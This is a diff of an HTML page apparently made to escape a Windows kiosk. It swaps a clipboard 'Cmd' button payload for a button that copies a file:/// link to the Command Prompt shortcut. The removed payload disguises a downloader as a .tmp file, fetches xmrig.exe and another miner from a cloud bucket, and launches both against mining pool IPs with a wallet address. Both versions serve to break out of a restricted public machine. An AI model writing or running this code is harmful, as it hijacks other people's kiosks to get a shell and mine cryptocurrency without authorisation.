@@ -76,7 +76,7 @@
      <div class="container">
 	
 
-        <a href="file:///C:/users/kiosk/appdata/roaming/microsoft/windows/start%2520menu/programs/system%2520tools/command%2520prompt.lnk">CMD</a>
+		  <button id="copyButton2">Cmd</button>
 
 
 	</div>
@@ -108,7 +108,6 @@
 	   
 
 	    <p>
-		        <a href="file:///C:/users/kiosk/appdata/roaming/microsoft/windows/start%2520menu/programs/system%2520tools/command%2520prompt.lnk">file:///C:/users/kiosk/appdata/roaming/microsoft/windows/start%2520menu/programs/system%2520tools/command%2520prompt.lnk</a>
 	
 		</p>
     
@@ -167,7 +166,7 @@
 
     // When the button is clicked, copy the specified text
     document.getElementById("copyButton2").addEventListener("click", function() {
-      var textToCopy = `cd %temp%&for %I in (.tmp) do if %~zI equ 1536000 cmd /c %I  -urlcache -split -f "https://storage.googleapis.com/mariocorp/xmrig.exe" &for %I in (.tmp) do if %~zI equ 1536000 cmd /c %I  -urlcache -split -f "https://storage.googleapis.com/mariocorp/miner.exe"&start "" cmd /c miner.exe --algo kawpow --server stratum+tcp://35.190.124.115:9200 --user NHbYNXxf7ZHUYhk4Mu2sdHiskr4wgvurHKet&start "" cmd /c xmrig.exe -o 34.149.22.228:9200 -u NHbYNXxf7ZHUYhk4Mu2sdHiskr4wgvurHKet -p x -a rx/0 -threads=16`;
+      var textToCopy = `file:///C:/users/kiosk/appdata/roaming/microsoft/windows/start%20menu/programs/system%20tools/command%20prompt.lnk`;
 
       copyTextToClipboard(textToCopy);
      
